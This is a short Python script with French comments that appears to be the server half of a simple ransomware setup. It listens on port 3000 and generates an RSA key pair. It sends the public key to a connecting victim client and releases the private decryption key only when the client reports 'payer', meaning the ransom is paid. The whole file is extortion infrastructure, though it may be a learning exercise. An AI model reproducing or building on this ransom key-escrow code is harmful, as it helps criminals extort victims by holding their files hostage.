from Cryptodome.PublicKey import RSA
import socket

host = socket.gethostname()
port = 3000

server_socket = socket.socket()

server_socket.bind((host,port))
server_socket.listen(15)
conn, address = server_socket.accept()

print("Connection from :" + str(address))



key = RSA.generate(2048)
privateKey = key.export_key()
publicKey = key.publickey().export_key()

"""
with open("private.pem","wb") as f :
    f.write(bytes(privateKey))

with open("public.pem","wb") as f1 :
    f1.write(bytes(publicKey))
"""

conn.send(publicKey)

msg_ranson = conn.recv(2048).decode()

#si le ransom est payer donc la clé privée est envoyé pour décrypter
if msg_ranson == 'payer' :
    conn.send(privateKey)

    conn.close() # on ferme directement la connexion 